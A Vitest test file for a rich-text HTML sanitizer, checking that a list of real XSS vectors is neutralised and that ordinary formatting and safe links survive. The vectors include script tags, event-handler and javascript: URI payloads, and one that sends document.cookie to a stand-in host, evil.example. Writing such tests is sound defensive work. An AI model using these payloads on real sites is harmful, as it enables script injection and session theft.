import { describe, expect, it } from 'vitest';
import {
  escapeHtml,
  MAX_RICH_TEXT_LENGTH,
  richTextSummary,
  richTextToPlain,
  sanitizeRichText,
} from './index.js';

/**
 * XSS payloads, not shapes (ADR-0024, CLAUDE.md §10).
 *
 * Every case below is a real vector rather than an invented one, because the
 * only honest test of an allow-list is the thing an attacker would actually
 * send. The assertions deliberately check the *absence of the dangerous part*
 * — a tag, a scheme, an attribute — rather than a particular rendering, so a
 * sanitizer upgrade that escapes differently does not fail the suite while a
 * sanitizer change that lets script through does.
 */
const SCRIPT_VECTORS: readonly string[] = [
  '<script>alert(1)</script>',
  '<SCRIPT SRC=//evil.example/x.js></SCRIPT>',
  '<scr<script>ipt>alert(1)</scr</script>ipt>',
  '<img src=x onerror=alert(1)>',
  '<img src="x" onerror="fetch(\'//evil.example?c=\'+document.cookie)">',
  '<svg onload=alert(1)>',
  '<svg><script>alert(1)</script></svg>',
  '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
  '<svg><use href="data:image/svg+xml;base64,PHN2Zz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+"></use></svg>',
  '<iframe src="javascript:alert(1)"></iframe>',
  '<object data="javascript:alert(1)"></object>',
  '<embed src="//evil.example/x.swf">',
  '<body onload=alert(1)>',
  '<div onmouseover="alert(1)">hover</div>',
  '<a href="javascript:alert(1)">click</a>',
  '<a href="JaVaScRiPt:alert(1)">click</a>',
  '<a href="java\tscript:alert(1)">click</a>',
  '<a href="&#106;avascript:alert(1)">click</a>',
  '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>',
  '<a href="vbscript:msgbox(1)">click</a>',
  '<form action="//evil.example"><input name="password"></form>',
  '<style>body{background:url("javascript:alert(1)")}</style>',
  '<p style="background:url(javascript:alert(1))">styled</p>',
  '<math><annotation-xml encoding="text/html"><script>alert(1)</script></annotation-xml></math>',
  '<template><script>alert(1)</script></template>',
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
  '<xmp><script>alert(1)</script></xmp>',
  '<base href="//evil.example/">',
  '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
  '<details open ontoggle=alert(1)>',
  '<marquee onstart=alert(1)>hi</marquee>',
  '<input autofocus onfocus=alert(1)>',
  '<link rel=stylesheet href="//evil.example/x.css">',
];

describe('sanitizeRichText', () => {
  it.each(SCRIPT_VECTORS)('neutralises %s', (payload) => {
    const clean = sanitizeRichText(payload) ?? '';
    const lowered = clean.toLowerCase();

    // No executable element survives.
    for (const tag of [
      '<script',
      '<svg',
      '<iframe',
      '<object',
      '<embed',
      '<form',
      '<input',
      '<style',
      '<math',
      '<template',
      '<base',
      '<meta',
      '<link',
      '<marquee',
      '<details',
      '<img',
    ]) {
      expect(lowered, `${payload} left ${tag}`).not.toContain(tag);
    }

    // No event handler and no script-bearing scheme survives, in any casing.
    expect(lowered).not.toMatch(/\son[a-z]+\s*=/);
    // Whitespace and NUL bytes dropped before comparing: a vector can hide a
    // scheme as `java\tscript:` or `java\0script:`, and a browser still runs
    // it. Split/join rather than a character class, because a NUL inside a
    // regular expression is a control character the linter rightly objects to.
    const squashed = lowered.split('\u0000').join('').replace(/\s/g, '');
    expect(squashed).not.toContain('javascript:');
    expect(squashed).not.toContain('vbscript:');
    expect(lowered).not.toContain('data:text/html');
    expect(lowered).not.toContain('style=');
  });

  it('keeps the formatting a person actually typed', () => {
    const clean = sanitizeRichText(
      '<p>Called <strong>Priya</strong> about the <em>quote</em>.</p><ul><li>Send revision</li></ul>',
    );
    expect(clean).toBe(
      '<p>Called <strong>Priya</strong> about the <em>quote</em>.</p><ul><li>Send revision</li></ul>',
    );
  });

  it('keeps an http link but hardens it', () => {
    const clean = sanitizeRichText('<a href="https://example.com/quote">quote</a>') ?? '';
    expect(clean).toContain('href="https://example.com/quote"');
    expect(clean).toContain('rel="noopener noreferrer nofollow"');
    expect(clean).toContain('target="_blank"');
  });

  it('drops the href of a javascript link but keeps the words', () => {
    const clean = sanitizeRichText('<a href="javascript:alert(1)">call Priya</a>') ?? '';
    expect(clean).not.toContain('javascript');
    expect(clean).toContain('call Priya');
  });

  it('strips an unknown tag but keeps its text', () => {
    expect(sanitizeRichText('<custom-widget>follow up</custom-widget>')).toBe('follow up');
  });

  it('discards the text inside a script rather than leaving it visible', () => {
    expect(richTextToPlain(sanitizeRichText('<script>alert(1)</script>'))).toBe('');
  });

  it('treats markup that sanitizes away to nothing as no body at all', () => {
    expect(sanitizeRichText('<script>alert(1)</script>')).toBeNull();
    expect(sanitizeRichText('   ')).toBeNull();
    expect(sanitizeRichText('')).toBeNull();
    expect(sanitizeRichText(null)).toBeNull();
    expect(sanitizeRichText(undefined)).toBeNull();
  });

  it('is idempotent: sanitizing a clean body changes nothing', () => {
    const once = sanitizeRichText('<p>Ring back <a href="https://x.example">here</a></p>');
    expect(sanitizeRichText(once)).toBe(once);
  });

  it('caps the length so one note cannot be a denial of service', () => {
    const huge = `<p>${'a'.repeat(MAX_RICH_TEXT_LENGTH * 2)}</p>`;
    expect((sanitizeRichText(huge) ?? '').length).toBeLessThanOrEqual(MAX_RICH_TEXT_LENGTH);
  });

  it('escapes text that was never markup', () => {
    expect(sanitizeRichText('5 < 6 & 7 > 2')).toBe('5 &lt; 6 &amp; 7 &gt; 2');
  });
});

describe('richTextToPlain', () => {
  it('reads out the words without any markup', () => {
    expect(richTextToPlain('<p>Call <strong>Priya</strong></p><p>at 4pm</p>')).toBe(
      'Call Priya at 4pm',
    );
  });

  it('is not fooled by a tag with an angle bracket in an attribute', () => {
    expect(richTextToPlain('<p title="><script>alert(1)</script>">safe</p>')).not.toContain(
      'alert',
    );
  });

  it('shortens a long body for a digest line', () => {
    const text = richTextSummary(`<p>${'word '.repeat(100)}</p>`, 20);
    expect(text.length).toBeLessThanOrEqual(20);
    expect(text.endsWith('…')).toBe(true);
  });
});

describe('escapeHtml', () => {
  it('escapes every character that can start markup', () => {
    expect(escapeHtml(`<img src=x onerror="alert('1')">`)).toBe(
      '&lt;img src=x onerror=&quot;alert(&#39;1&#39;)&quot;&gt;',
    );
  });
});
